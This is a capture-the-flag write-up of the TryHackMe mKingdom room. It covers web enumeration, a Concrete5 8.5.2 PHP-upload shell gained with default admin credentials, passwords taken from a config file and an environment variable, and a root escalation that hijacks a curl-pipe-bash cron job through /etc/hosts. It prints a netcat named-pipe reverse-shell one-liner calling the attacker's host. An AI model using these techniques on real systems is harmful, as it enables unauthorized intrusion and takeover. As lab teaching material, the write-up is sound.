---
layout: post
title: "TryHackMe: mKingdom WriteUp"
categories:
- CTF
- Web
- Linux Privilege Escalation
tags:
- CTF
- Web
- Linux Privilege Escalation
date: 2024-06-24 00:00 +0800
description: Beginner-friendly box inspired by a certain mustache man.
---
![Room Info](/assets/img/mKingdom/roomInfo.png)

## Summary

The mKingdom room on TryHackMe is an engaging challenge that tests your skills in web exploitation, privilege escalation. The key steps to pwn this room are as follows:

1. **Initial Access**: Exploit the Concrete5 CMS vulnerability to gain a shell as the `www-data` user.
2. **Credential Discovery**: Search through the configuration files of the site to find the password for the `toad` user.
3. **Environment Variable Inspection**: Discover the password for the `mario` user stored in an environment variable.
4. **Privilege Escalation**: Check scheduled tasks to find a `curl` request to a domain endpoint that pipes the output to `bash` with root permissions.
5. **Manipulating /etc/hosts**: Change the domain name's assigned IP in `/etc/hosts` and host a malicious bash script to get a reverse shell as the `root` user.

By following these steps, you will successfully root the machine and complete the mKingdom room.

## Initial Access

### Scanning and Enumeration

Start by scanning the IP with Nmap on the top 1000 ports:

```bash
$ nmap 10.10.56.103 -sV
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-24 12:29 +0330
Nmap scan report for 10.10.56.103
Host is up (0.41s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
53/tcp open  domain  (generic dns response: SERVFAIL)
85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.94%I=7%D=6/24%Time=667935BF%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x82\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.45 seconds
```
The scan reveals two open ports:

- Port 53: (Possible false positive)
- Port 85: Apache server


Port 85:

![Root Domain Screen](/assets/img/mKingdom/0.png)

To discover content, run ffuf:

```bash
$ ffuf -u http://10.10.56.103:85/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -c                                                                                                                          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.56.103:85/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 286, Words: 21, Lines: 11, Duration: 4613ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 281, Words: 21, Lines: 11, Duration: 4703ms]
    * FUZZ: .hta

[Status: 403, Size: 286, Words: 21, Lines: 11, Duration: 4704ms]
    * FUZZ: .htaccess

[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 436ms]
    * FUZZ: app

[Status: 200, Size: 647, Words: 147, Lines: 34, Duration: 491ms]
    * FUZZ: index.html

[Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 404ms]
    * FUZZ: server-status

:: Progress: [4724/4724] :: Job [1/1] :: 72 req/sec :: Duration: [0:00:54] :: Errors: 0 ::
```


Ffuf output indicates an /app directory with a button that redirects to /app/castle/ using JavaScript.
![1](/assets/img/mKingdom/1.png)
![2](/assets/img/mKingdom/2.png)

Examining the HTML source of the directory shows that it is running Concrete5 version 8.5.2.
![3](/assets/img/mKingdom/3.png)

### Exploiting Concrete5
Before fuzzing for more directories, search for exploits related to Concrete5 version 8.5.2. This version has a known vulnerability that allows uploading a PHP shell.

![4](/assets/img/mKingdom/4.png)
![5](/assets/img/mKingdom/5.png)

#### Logging In and Uploading a Shell
According to the exploit, we need to log in to the web application, allow PHP extensions, and upload a PHP shell.

![6](/assets/img/mKingdom/6.png)

First, search Google for the default username of Concrete5, which is admin. After some brute-forcing, log in with the following credentials:

- Username: `admin`
- Password: `password`


Navigate to the Dashboard menu and go to the "Allowed File Types" in the "System & Settings" field.

![7](/assets/img/mKingdom/7.png)

Add php as an allowed extension

![8](/assets/img/mKingdom/8.png)

Upload the malicious PHP file from the "Files" section as shown below:

![9](/assets/img/mKingdom/9.png)

![10](/assets/img/mKingdom/10.png)

After successfully uploading the PHP shell, navigate to the file's URL to execute it and gain a reverse shell as the www-data user.

![11](/assets/img/mKingdom/11.png)

![12](/assets/img/mKingdom/12.png)


Get a reverse shell: 
```bash
$ nc -nvlp 4444
Connection from 10.10.56.103:43612
sh: 0: can't access tty; job control turned off
$ pwd
/var/www/html/app/castle/application/files/8617/1908/8167
$ whoami
www-data
```

## Privilege Escalation

### Discovering Toad's Password

While exploring the web files, you will find Toad's password in the `database.php` file. 

```bash
$ cat /var/www/html/app/castle/application/config/database.php
<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => '[REDACTED]',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];
```

Use this password to get a proper shell with Python and switch to the Toad user using `su`.

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@mkingdom:/var/www/html/app/castle/application$ ^Z       
[1]  + 30481 suspended  nc -nvlp 4444
~  $ stty raw -echo; fg                                                                                                                                                                                                                 148 ↵
[1]  + 30481 continued  nc -nvlp 4444

www-data@mkingdom:/var/www/html/app/castle/application$ su toad
Password: 
toad@mkingdom:/var/www/html/app/castle/application$
```

### Transition to Mario User

Toad's home directory doesn't contain anything interesting, and Toad can't run any sudo commands either. However, by checking various directories and configurations, you will find Mario's password stored in an environment variable, encoded in base64.

```bash
toad@mkingdom:~$ ls
Desktop    Downloads  Pictures  smb.txt    Videos
Documents  Music      Public    Templates
toad@mkingdom:~$ cat smb.txt 

Save them all Mario!

                                      \| /
                    ....'''.           |/
             .''''''        '.       \ |
             '.     ..     ..''''.    \| /
              '...''  '..''     .'     |/
     .sSSs.             '..   ..'    \ |
    .P'  `Y.               '''        \| /
    SS    SS                           |/
    SS    SS                           |
    SS  .sSSs.                       .===.
    SS .P'  `Y.                      | ? |
    SS SS    SS                      `==='
    SS ""    SS
    P.sSSs.  SS
    .P'  `Y. SS
    SS    SS SS                 .===..===..===..===.
    SS    SS SS                 |   || ? ||   ||   |
    ""    SS SS            .===.`==='`==='`==='`==='
  .sSSs.  SS SS            |   |
 .P'  `Y. SS SS       .===.`==='
 SS    SS SS SS       |   |
 SS    SS SS SS       `==='
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS


toad@mkingdom:~$ sudo -l
[sudo] password for toad:              
Sorry, user toad may not run sudo on mkingdom.


toad@mkingdom:~$ env
APACHE_PID_FILE=/var/run/apache2/apache2.pid
XDG_SESSION_ID=c2
SHELL=/bin/bash
APACHE_RUN_USER=www-data
OLDPWD=/var/www/html/app/castle/application
USER=toad
LS_COLORS=
PWD_token=[BASE64_STRING]
MAIL=/var/mail/toad
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
APACHE_LOG_DIR=/var/log/apache2
PWD=/home/toad
LANG=en_US.UTF-8
APACHE_RUN_GROUP=www-data
HOME=/home/toad
SHLVL=2
LOGNAME=toad
LESSOPEN=| /usr/bin/lesspipe %s
XDG_RUNTIME_DIR=/run/user/1002
APACHE_RUN_DIR=/var/run/apache2
APACHE_LOCK_DIR=/var/lock/apache2
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env



% echo "[BASE64_STRING]" | base64 -d
[REDACTED]
```
After switching to Mario, you will find the user's flag inside Mario's home directory. Note that the cat binary has unusual permissions, as it is owned by Toad and will be run with Toad's permissions. Therefore, to read the user.txt file owned by Mario, use the head binary instead.

```bash
toad@mkingdom:~$ ls /home
mario  toad

toad@mkingdom:~$ su mario
Password: 

mario@mkingdom:/home/toad$ cd ~

mario@mkingdom:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt

mario@mkingdom:~$ cat user.txt
cat: user.txt: Permission denied

mario@mkingdom:~$ ls -la user.txt 
-rw-r--r-- 1 root root 38 Nov 27  2023 user.txt

mario@mkingdom:~$ ls -la /bin/cat
-rwsr-xr-x 1 toad root 47904 Mar 10  2016 /bin/cat

mario@mkingdom:~$ head user.txt
[REDACTED]
```
### Investigating Privilege Escalation

Mario has permission to run the id binary using sudo, but this doesn't lead to any useful privilege escalation path. Further examination of configurations and files also doesn't yield any promising leads.

```bash
mario@mkingdom:~$ sudo -l
[sudo] password for mario:             
Matching Defaults entries for mario on mkingdom:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    pwfeedback

User mario may run the following commands on mkingdom:
    (ALL) /usr/bin/id
```

### Analyzing Scheduled Tasks

To uncover potential scheduled tasks, use the pspy tool (https://github.com/DominicBreuker/pspy). Host the pspy binary on your system and transfer it to the target machine using wget.

```bash
mario@mkingdom:~$ wget http://[YOUR IP]:8000/pspy
--2024-06-24 16:48:46--  http://[YOUR IP]:8000/pspy
Connecting to [YOUR IP]:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy’

100%[======================================>] 3,104,768   76.8KB/s   in 45s    

2024-06-24 16:49:32 (67.9 KB/s) - ‘pspy’ saved [3104768/3104768]

mario@mkingdom:~$ chmod +x pspy
mario@mkingdom:~$ ./pspy
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
[...]
2024/06/22 16:51:01 CMD: UID=0     PID=3193   | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log
[...]
```
Running pspy reveals that there is a process that curls to mkingdom.thm:85/app/castle/application/counter.sh and pipes the output to bash.


### Gaining Root Access

Due to the permissions of `/var/www/html/app/castle/application/counter.sh`, you can't edit this file directly. However, you can change the IP address for `mkingdom.thm` in /etc/hosts to redirect it to your own machine. Host a malicious script at the same endpoint and set up an HTTP server on port 85 to serve the reverse shell payload.

```bash
mario@mkingdom:~$ cat /var/www/html/app/castle/application/counter.sh 
#!/bin/bash
echo "There are $(ls -laR /var/www/html/app/castle/ | wc -l) folder and files in TheCastleApp in - - - - > $(date)."

mario@mkingdom:~$ cat /etc/hosts
[...]
127.0.1.1	mkingdom.thm
[...]
```

In your machine:

```bash
$ cat app/castle/application/counter.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [YOUR IP] 4445 >/tmp/f


$ sudo python3 -m http.server 85
Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...
10.10.56.103 - - [23/Jun/2024 00:29:02] "GET /app/castle/application/counter.sh HTTP/1.1" 200 -
```

After one minute, a shell will be spawned with root access.

```bash
% nc -nvlp 4445  
Connection from 10.10.56.103:58790
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# head /root/root.txt
[REDACTED]
```